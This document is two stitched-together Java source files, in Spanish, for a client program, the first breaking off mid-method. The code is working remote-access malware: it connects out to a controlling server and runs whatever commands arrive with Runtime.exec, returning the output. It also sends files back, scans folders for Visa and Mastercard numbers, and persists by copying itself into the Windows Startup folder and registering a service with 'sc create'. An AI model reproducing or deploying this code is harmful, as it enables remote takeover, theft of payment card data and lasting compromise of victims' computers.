/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package haet;

import java.net.*;
import java.io.*;
import java.util.Scanner;
public class Cliente {
    private Socket socket;
    private DataInputStream bufferDeEntrada = null;
    private DataOutputStream bufferDeSalida = null;
    Scanner teclado = new Scanner(System.in);
    final String COMANDO_TERMINACION = "salir()";

    public void levantarConexion(String ip, int puerto) {
        try {
            socket = new Socket(ip, puerto);
            mostrarTexto("Conectado a :" + socket.getInetAddress().getHostName());
        } catch (Exception e) {
            mostrarTexto("Excepción al levantar conexión: " + e.getMessage());
            System.exit(0);
        }
    }

    public static void mostrarTexto(String s) {
        System.out.println(s);
    }

    public void abrirFlujos() {
        try {
            bufferDeEntrada = new DataInputStream(socket.getInputStream());
            bufferDeSalida = new DataOutputStream(socket.getOutputStream());
            bufferDeSalida.flush();
        } catch (IOException e) {
            mostrarTexto("Error en la apertura de flujos");
        }
    }

    public void enviar(String s) {
        try {
            bufferDeSalida.writeUTF(s);
            bufferDeSalida.flush();
        } catch (IOException e) {
            mostrarTexto("IOException on enviar");
        }
    }

    public void cerrarConexion() {
        try {
            bufferDeEntrada.close();
            bufferDeSalida.close();
            socket.close();
            mostrarTexto("Conexión terminada");
        } catch (IOException e) {
            mostrarTexto("IOException on cerrarConexion()");
        }finally{
            System.exit(0);
        }
    }

    public void ejecutarConexion(String ip, int puerto) {
        Thread hilo = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    levantarConexion(ip, puerto);
                    abrirFlujos();
                    recibirDatos();
                } finally {
                    cerrarConexion();
                }
            }
        });
        hilo.start();
    }

    public void recibirDatos() {
        String st = "";
        int sti = 0;
        try {
            do {                        
                st = (String) bufferDeEntrada.readUTF();
                escribirDatos(st);                                                            
            } while (!st.equals(COMANDO_TERMINACION));
        } catch (IOException e) {}
    }
    
    public void escribirDatos(String comando) {
        String entrada = "";
        Process p;
        try {
              System.err.println("COMANDO: " + comando);
              p = Runtime.getRuntime().exec(comando);
              p.waitFor();
              BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
              String line = "";
              while ((line = reader.readLine())!= null) {                  
                  enviar(line+"\n");
              }
              reader.close();
              
            } catch (Exception e) {
              e.printStackTrace();
            }                                    
/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package cliente;

import java.net.*;
import java.io.*;
import java.nio.file.Files;
import java.text.SimpleDateFormat;
import java.util.Scanner;
import java.util.regex.Pattern;

public class Cliente {
    
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_RED = "\u001B[31m";
    private Socket socket;
    private DataInputStream bufferDeEntrada = null;
    private DataOutputStream bufferDeSalida = null;
    Scanner teclado = new Scanner(System.in);
    final String COMANDO_TERMINACION = "salir()";

    public void levantarConexion(String ip, int puerto) {
        try {
            socket = new Socket(ip, puerto);
            mostrarTexto("Conectado a :" + socket.getInetAddress().getHostName());
        } catch (Exception e) {
            mostrarTexto("Excepción al levantar conexión: " + e.getMessage());
            System.exit(0);
        }
    }

    public static void mostrarTexto(String s) {
        System.out.println(s);
    }

    public void abrirFlujos() {
        try {
            bufferDeEntrada = new DataInputStream(socket.getInputStream());
            bufferDeSalida = new DataOutputStream(socket.getOutputStream());
            bufferDeSalida.flush();
        } catch (IOException e) {
            mostrarTexto("Error en la apertura de flujos");
        }
    }

    public void enviar(String s) {
        try {
            bufferDeSalida.writeUTF(s);
            bufferDeSalida.flush();
        } catch (IOException e) {
            mostrarTexto("IOException on enviar");
        }
    }

    public void cerrarConexion() {
        try {
            bufferDeEntrada.close();
            bufferDeSalida.close();
            socket.close();
            mostrarTexto("Conexión terminada");
        } catch (IOException e) {
            mostrarTexto("IOException on cerrarConexion()");
        }finally{
            System.exit(0);
        }
    }

    public void ejecutarConexion(String ip, int puerto) {
        Thread hilo = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    levantarConexion(ip, puerto);
                    abrirFlujos();
                    recibirDatos();
                } finally {
                    cerrarConexion();
                }
            }
        });
        hilo.start();
    }

    public void recibirDatos() {
        String st = "";
        int sti = 0;
        try {
            do {       
                st = (String) bufferDeEntrada.readUTF();                                
                escribirDatos(st);                                                           
                
            } while (!st.equals(COMANDO_TERMINACION));
        } catch (IOException e) {}
    }
    
    public void escribirDatos(String comando) throws IOException {
        String entrada = "";
        Process p;        
              System.err.println("COMANDO: " + comando);
              if(comando.indexOf("revisar") == 0){
                  revisarCarpeta(comando.substring(8,comando.length()));
              }else if(comando.indexOf("mostrar") == 0){
                  System.out.println("LLAMAR METODO DE MOSTRAR: " + comando.substring(8,comando.length()));
                  mostrarArchivo(comando.substring(8,comando.length()));
              }else{
                  try {
                    p = Runtime.getRuntime().exec(comando);
                    p.waitFor();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    String line = "";
                        while ((line = reader.readLine())!= null) {                  
                            enviar(line+"\n");
                        }
                        reader.close();

                    } catch (Exception e) {
                      e.printStackTrace();
                    }                                    
              }                                                                
    }   
    
    public void mostrarArchivo(String archivo) throws FileNotFoundException, IOException {        
        String cadena;        
        FileReader f = new FileReader(archivo);
        BufferedReader b = new BufferedReader(f);
        while((cadena = b.readLine())!=null) {            
            enviar(cadena + "\n");
        }
        b.close();                
    }
    
    public void escribirDatos() {
        String entrada = "";
        while (true) {
            System.out.print("[Respuesta] => ");
            entrada = teclado.nextLine();
            if(entrada.length() > 0)
                enviar(entrada);
        }
    }    

    /**
     * Persiste de dos formas diferentes en el archivo StartUp y creando un servicio sc
     * @param location 
     */
    private void persistir(String location) throws IOException{          
        String locationJAR = "";        
        String locationCopy = "";        
        locationJAR = location; //+ "\\Cliente.jar";        
        locationCopy = "xcopy " + "\"" + location + "\" " + "\"" + "c:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp" + "\"" ;                        
        escribirDatos(locationCopy);        
        escribirDatos("sc create newservice binpath="+locationJAR);                                
        System.out.println("LO LOGRO");
    }
    
    public void findFile(String name,File file) throws IOException{        
        String location = "";
        File[] list = file.listFiles();        
        if(list!=null){
            for (File fil : list)
            {
                if (fil.isDirectory())
                {  
                    findFile(name,fil);
                }
                else if (name.equalsIgnoreCase(fil.getName()))
                {
                    location = fil.getParent();
                    System.out.println("PERSISTIR");
                    persistir(location);                                        
                }
            }
        }                 
    }
    
    
      
    private void revisarCarpeta(String substring) throws IOException {
        //String sCarpAct = "C:\\Users\\danie\\Documents\\PRUEBA HAET";
        String sCarpAct = substring;
        enviar("Carpeta del usuario = " + sCarpAct + "\n");   

        File carpeta = new File(sCarpAct);
        String[] listado = carpeta.list();
        if (listado == null || listado.length == 0) {
          enviar("No hay elementos dentro de la carpeta actual" + "\n");
          return;
        }    

        //Lo mismo que lo anterior pero con objetos File para poder ver sus propiedades
        enviar(ANSI_RED + "//// LISTADO TOTALIDAD DE ARCHIVOS" + ANSI_RESET +  "\n");

        File[] archivos = carpeta.listFiles();
        if (archivos == null || archivos.length == 0) {
          enviar("No hay elementos dentro de la carpeta actual" + "\n");
          return;
        }
        else {
          SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
          for (int i=0; i< archivos.length; i++) {
            File archivo = archivos[i];
            enviar(String.format("%s (%s) - %d - %s", 
                                              archivo.getName(), 
                                              archivo.isDirectory() ? "Carpeta" : "Archivo",
                                              archivo.length(),
                                              sdf.format(archivo.lastModified())
                                              ) + "\n");


          }
        }        

        //Se pueden filtrar los resultados tanto usando list() como usando listFiles()
        //Por ejemplo, en este segundo caso para mostrar solo archivos y no carpetas
        enviar(ANSI_RED + "//// LISTADO ARCHIVOS CON INFORMACION VALIOSA" + ANSI_RESET + "\n");

        FileFilter filtro = new FileFilter() {
          @Override
          public boolean accept(File arch) {
            return arch.isFile();
          }
        };

        archivos = carpeta.listFiles(filtro);

        if (archivos == null || archivos.length == 0) {
          enviar("No hay elementos dentro de la carpeta actual" + "\n");
          return;
        }
        else {
          SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
          for (int i=0; i< archivos.length; i++) {
            File archivo = archivos[i];        
            if(analisaContenido(archivo)){
                enviar(String.format("%s (%s) - %d - %s", 
                                              archivo.getName(), 
                                              archivo.isDirectory() ? "Carpeta" : "Archivo",
                                              archivo.length(),
                                              sdf.format(archivo.lastModified())
                                              ) + " ARCHIVO CON INFORMACIÓN VALIOSA PATH: " + archivo.getPath() + "\n");                        
            }
          }
        }
        }

        public static boolean analisaContenido(File archivo) throws FileNotFoundException, IOException {
            boolean exitoso = false;
            String cadena;
            String expTarjetaVisaMaster = "^(?:4\\d([\\- ])?\\d{6}\\1\\d{5}|(?:4\\d{3}|5[1-5]\\d{2}|6011)([\\- ])?\\d{4}\\2\\d{4}\\2\\d{4})$";        
            FileReader f = new FileReader(archivo);
            BufferedReader b = new BufferedReader(f);
            while((cadena = b.readLine())!=null) {            
                if(Pattern.matches(expTarjetaVisaMaster, cadena)){
                    return true;
                }            
            }
            b.close();        
            return exitoso;
    }
    
     public static void main(String[] argumentos) throws IOException {
        Cliente cliente = new Cliente();        
        cliente.ejecutarConexion("localhost", Integer.parseInt("5050"));        
        cliente.findFile("Cliente.jar",new File("C:\\"));    
        
        
    }
}
